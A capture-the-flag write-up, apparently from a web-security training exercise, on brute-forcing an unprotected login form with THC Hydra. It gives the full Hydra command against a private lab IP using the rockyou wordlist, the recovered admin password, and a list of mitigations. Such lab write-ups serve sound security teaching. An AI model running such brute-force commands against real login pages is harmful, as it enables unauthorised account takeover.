# 🔑 Flag: Sign In — Brute Force Attack with THC Hydra

## Vulnerability Type
**Broken Authentication** — No Rate Limiting / No Brute-Force Protection

## Description

The login form has no protection against automated password-guessing attacks:
- No CAPTCHA
- No account lockout
- No request rate limiting
- No multi-factor authentication

This makes it trivially vulnerable to a **brute-force dictionary attack** using tools like THC Hydra.

## Exploit

Following OWASP testing guidelines, the form's source code was inspected first to confirm the absence of any retry delay or token mechanism. Once confirmed, THC Hydra was used with the `rockyou.txt` wordlist — one of the most commonly used password dictionaries in security testing.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.64.17 http-post-form \
  "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
```

### Result

The correct password is **`shadow`**, which is a very common password found near the top of `rockyou.txt`.

| Credential | Value |
|------------|-------|
| Username | `admin` |
| Password | `shadow` |

## How It Works

THC Hydra sends thousands of HTTP POST requests to the login endpoint, substituting a different password from the wordlist on each attempt. Because the server responds identically regardless of how many failed attempts occur, Hydra can iterate through the entire dictionary and detect the successful login by looking for the absence of the failure indicator.

## Mitigation

- Implement **account lockout** or **progressive delays** after N failed attempts.
- Add **CAPTCHA** to the login form to prevent automated submissions.
- Enforce **strong password policies** — `shadow` should never be a valid admin password.
- Consider **multi-factor authentication (MFA)**.
- Monitor and alert on anomalous login attempt rates.
